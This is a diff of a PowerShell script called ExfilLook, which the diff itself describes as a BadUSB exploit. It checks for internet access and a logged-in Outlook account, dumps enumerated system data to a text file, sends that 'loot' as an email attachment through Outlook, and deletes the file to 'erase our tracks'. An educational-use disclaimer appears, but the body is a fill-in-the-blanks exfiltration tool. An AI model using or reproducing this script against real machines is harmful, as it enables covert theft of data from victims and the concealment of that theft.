@@ -1,5 +1,5 @@
-Write-Output " "
 Write-Output @"
+
         __   ____   _        ___      __     ____     ______      _____      ___     _    _
 \    ___) \  \  /  / \    ___) (_    _) \   |    \   |      )    (     )    (   \   | )  / 
  |  (__    \  \/  /   |  (__     |  |    |  |     |  |     /      \   /      \   |  |/  /  
@@ -9,24 +9,16 @@ Write-Output @"
 
 v.1.0 
 by Jonmar Corpuz
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+| DISCLAIMER: This tool is made for educational purposes only and should only be tested on machines and systems that you have permission to test or personally own." |
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 "@
 
-Write-Output " "
-Write-Output "------------------------------------------------------------------------"
-Write-Output " "
-
-Write-Output "What is ExfilLook?"
-Write-Output " "
-Write-Output "ExfilLook is a BadUSB exploit written in DuckyScript that enumerates data from a compromised Windows system and exfiltrates that data using Outlook."
-Write-Output " "
-Write-Output "DISCLAIMER: This tool is made for educational purposes only and should only be tested on machines and systems that you have permission to test or personally own."
-
-Write-Output " "
-Write-Output "------------------------------------------------------------------------"
-Write-Output " "
-# ------------------------------------------------------------------------------------
-
-# Step 1: Test to see if the required processes are enabled on the machine
+# ---------------------------------------------------------------------------------- #
+# Step 1: Test to see if the required processes are enabled on the machine           #
+# ---------------------------------------------------------------------------------- #
 
 # Check for Internet connectivity
 if (Test-Connection -ComputerName 8.8.8.8 -Count 2 -Quiet) {
@@ -46,10 +38,10 @@ if (Test-Connection -ComputerName 8.8.8.8 -Count 2 -Quiet) {
     #ERROR: Machine isn't connected to the Internet.
     exit
 }
-# ------------------------------------------------------------------------------------
 
-# Step 2: Check if an account is logged in on Outloo
-# ------------------------------------------------------------------------------------ 
+# ---------------------------------------------------------------------------------- #
+# Step 2: Check if an account is logged in on Outlook                                #          
+# ---------------------------------------------------------------------------------- # 
 
 # Create an Outlook application object
 $outlook = New-Object -ComObject Outlook.Application
@@ -67,11 +59,9 @@ if ($outlook.Session.Accounts.Count -gt 0) {
 # Release the Outlook COM object
 #[System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null
 
-# ------------------------------------------------------------------------------------ 
-
-# Step 3: Enumerate the target data and redirect it to a text file
-# ------------------------------------------------------------------------------------ 
-
+# ---------------------------------------------------------------------------------- #
+# Step 3: Enumerate the target data and redirect it to a text file                   #
+# ---------------------------------------------------------------------------------- #
 # Define the file path and name
 $filePath = "PATH\FILENAME.txt" # FILL OUT
 
@@ -80,11 +70,9 @@ New-Item -ItemType File -Path $filePath -Force
 
 COMMAND > "PATH\FILENAME.txt" # FILL OUT
 
-# ------------------------------------------------------------------------------------ 
-
-# Step 4: Exfiltrate the text file containing the loot using Outlook
-# ------------------------------------------------------------------------------------ 
-
+# ---------------------------------------------------------------------------------- #
+# Step 4: Exfiltrate the text file containing the loot using Outlook                 #
+# ---------------------------------------------------------------------------------- #
 $ATTACHMENT = "{PATH}\{FILENAME}.txt"
 $outlook = New-Object -comobject outlook.application
 $email = $outlook.CreateItem(0)
@@ -94,10 +82,9 @@ $email.Body = "Proof of Concept" # CHANGE (Optional)
 $email.Attachments.add($ATTACHMENT) | Out-Null
 $email.Send()
 $outlook.Quit()
-# ------------------------------------------------------------------------------------ 
 
-# Step 5: Erase our tracks from the target machine
-# ------------------------------------------------------------------------------------ 
-
+# ---------------------------------------------------------------------------------- #
+# Step 5: Erase our tracks from the target machine                                   #
+# ---------------------------------------------------------------------------------- #
 del $HOME/FILENAME.txt
 exit
